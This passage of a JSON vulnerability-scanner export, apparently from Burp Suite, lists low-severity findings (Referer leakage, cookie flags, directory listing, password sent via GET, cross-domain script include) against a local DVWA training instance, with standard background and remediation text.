        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "112": {
        "\ufeffissue__serialNumber": "3.66769E+18",
        "issue__type": "5243904",
        "issue__name": "Cross-domain Referer leakage",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli/",
        "issue__location": "/dvwa/vulnerabilities/sqli/",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
        "issue__remediationBackground": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\\n</p>",
        "issue__references": "<ul>\\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\">Referer Policy</a></li>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure\">Web Security Academy: Information disclosure</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200: Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "The page was loaded from a URL containing a query string:<ul><li>https://localhost:8888/dvwa/vulnerabilities/sqli/</li></ul>The response contains the following links to other domains:<ul><li>https://bobby-tables.com/</li><li>https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "https://bobby-tables.com/",
        "issue__issueDetailItems__issueDetailItem__002": "https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "113": {
        "\ufeffissue__serialNumber": "4.27422E+18",
        "issue__type": "5244416",
        "issue__name": "Cookie without HttpOnly flag set",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/security.php",
        "issue__location": "/dvwa/security.php",
        "issue__severity": "Low",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>",
        "issue__remediationBackground": "<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>\\n<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>",
        "issue__references": "<ul>\\n<li><a href='https://portswigger.net/web-security/cross-site-scripting/exploiting'>Web Security Academy: Exploiting XSS vulnerabilities</a></li>\\n<li><a href='https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly'>HttpOnly effectiveness</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/31.html\">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li>\\n</ul>",
        "issue__issueDetail": "The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "Session: PHPSESSID",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "114": {
        "\ufeffissue__serialNumber": "6.15194E+18",
        "issue__type": "6291712",
        "issue__name": "Directory listing",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/hackable/uploads/",
        "issue__location": "/dvwa/hackable/uploads/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Web servers can be configured to automatically list the contents of directories that do not have an index page present. This can aid an attacker by enabling them to quickly identify the resources at a given path, and proceed directly to analyzing and attacking those resources. It particularly increases the exposure of sensitive files within the directory that are not intended to be accessible to users, such as temporary files and crash dumps.</p>\\n<p>Directory listings themselves do not necessarily constitute a security vulnerability. Any sensitive resources within the web root should in any case be properly access-controlled, and should not be accessible by an unauthorized party who happens to know or guess the URL. Even when directory listings are disabled, an attacker may guess the location of sensitive files using automated tools.</p>",
        "issue__remediationBackground": "<p>There is not usually any good reason to provide directory listings, and disabling them may place additional hurdles in the path of an attacker. This can normally be achieved in two ways:</p>\\n<ul>\\n<li>Configure your web server to prevent directory listings for all paths beneath the web root; </li>\\n<li>Place into each directory a default file (such as index.htm) that the web server will display instead of returning a directory listing.</li></ul>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure/exploiting#directory-listings\">Web Security Academy: Information disclosure via directory listings</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/538.html\">CWE-538: File and Directory Information Exposure</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/548.html\">CWE-548: Information Exposure Through Directory Listing</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/37.html\">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "115": {
        "\ufeffissue__serialNumber": "4.81269E+18",
        "issue__type": "8389888",
        "issue__name": "Content type is not specified",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/README.zh.md",
        "issue__location": "/dvwa/README.zh.md",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>If a  response does not specify a content type, then the browser will usually analyze the response and attempt to determine the MIME type of its content. This can have unexpected results, and if the content contains any user-controllable data may lead to cross-site scripting or other client-side vulnerabilities.</p>\\n<p>In most cases, the absence of a content type statement does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>",
        "issue__remediationBackground": "<p>For every response containing a message body, the application should include a single Content-type header that correctly and unambiguously states the MIME type of the content in the response body.</p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/63.html\">CAPEC-63: Cross-Site Scripting (XSS)</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "116": {
        "\ufeffissue__serialNumber": "4.31077E+18",
        "issue__type": "5243392",
        "issue__name": "TLS cookie without secure flag set",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/security.php",
        "issue__location": "/dvwa/security.php",
        "issue__severity": "Medium",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.</p>\\n<p>To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>",
        "issue__remediationBackground": "<p>The secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.</p>",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/614.html\">CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a></li>\\n</ul>",
        "issue__issueDetail": "The following cookie was issued by the application and does not have the secure flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "Session: PHPSESSID",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "117": {
        "\ufeffissue__serialNumber": "2.77213E+18",
        "issue__type": "4195072",
        "issue__name": "Password submitted using GET method",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/brute/",
        "issue__location": "/dvwa/vulnerabilities/brute/",
        "issue__severity": "Low",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Some applications use the GET method to submit passwords, which are transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL increases the risk that they will be captured by an attacker.</p>\\n<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>",
        "issue__remediationBackground": "<p>All forms submitting passwords should use the POST method. To achieve this, applications should specify the method attribute of the FORM tag as <b>method=\"POST\"</b>. It may also be necessary to modify the corresponding server-side form handler to ensure that submitted passwords are properly retrieved from the message body, rather than the URL.\\n</p>",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/598.html\">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/37.html\">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>\\n</ul>",
        "issue__issueDetail": "The page contains a form with the following action URL, which is submitted using the GET method:<ul><li>https://localhost:8888/dvwa/vulnerabilities/brute/</li></ul>The form contains the following password field:<ul><li>password</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "password",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "118": {
        "\ufeffissue__serialNumber": "5.30283E+18",
        "issue__type": "5244160",
        "issue__name": "Cross-domain script include",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/captcha/",
        "issue__location": "/dvwa/vulnerabilities/captcha/",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>When an application includes a script from an external domain, this script is executed by the browser within the security context of the invoking application. The script can therefore do anything that the application's own scripts can do, such as accessing application data and performing actions within the context of the current user.</p>\\n<p>If you include a script from an external domain, then you are trusting that domain with the data and functionality of your application, and you are trusting the domain's own security to prevent an attacker from modifying the script to perform malicious actions within your application. </p>",
        "issue__remediationBackground": "<p>Scripts should ideally not be included from untrusted domains. Applications that rely on static third-party scripts should consider using Subresource Integrity to make browsers verify them, or copying the contents of these scripts onto their own domain and including them from there. If that is not possible (e.g. for licensing reasons) then consider reimplementing the script's functionality within application code.</p>",
        "issue__references": "<ul>\\n<li>\\n<a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\">Subresource Integrity</a>\\n</li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/829.html\">CWE-829: Inclusion of Functionality from Untrusted Control Sphere</a></li>\\n</ul>",
        "issue__issueDetail": "The response dynamically includes the following script from another domain:<ul><li>https://www.google.com/recaptcha/api.js</li></ul>",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
